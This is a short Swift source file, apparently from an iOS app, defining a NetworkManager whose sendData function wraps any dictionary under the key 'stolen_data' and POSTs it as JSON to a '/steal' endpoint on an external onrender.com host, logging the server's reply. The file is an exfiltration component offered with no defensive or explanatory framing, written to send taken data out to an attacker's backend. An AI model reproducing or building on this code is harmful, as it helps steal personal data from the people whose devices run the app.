import Foundation
import Foundation

class NetworkManager {
    static func sendData(dict: [String: Any]) {
        guard let url = URL(string: "https://frog-ios-xm5a.onrender.com/steal") else {
            print("❌ Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")

        // Wrap your payload inside "stolen_data"
        let fullPayload: [String: Any] = ["stolen_data": dict]
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: fullPayload)
        } catch {
            print("❌ Failed to encode JSON: \(error.localizedDescription)")
            return
        }

        print("📤 Sending to backend: \(fullPayload)")

        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("❌ Network error: \(error.localizedDescription)")
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                print("✅ Response status: \(httpResponse.statusCode)")
            }

            if let data = data,
               let responseText = String(data: data, encoding: .utf8) {
                print("📩 Server replied: \(responseText)")
            }
        }.resume()
    }
}
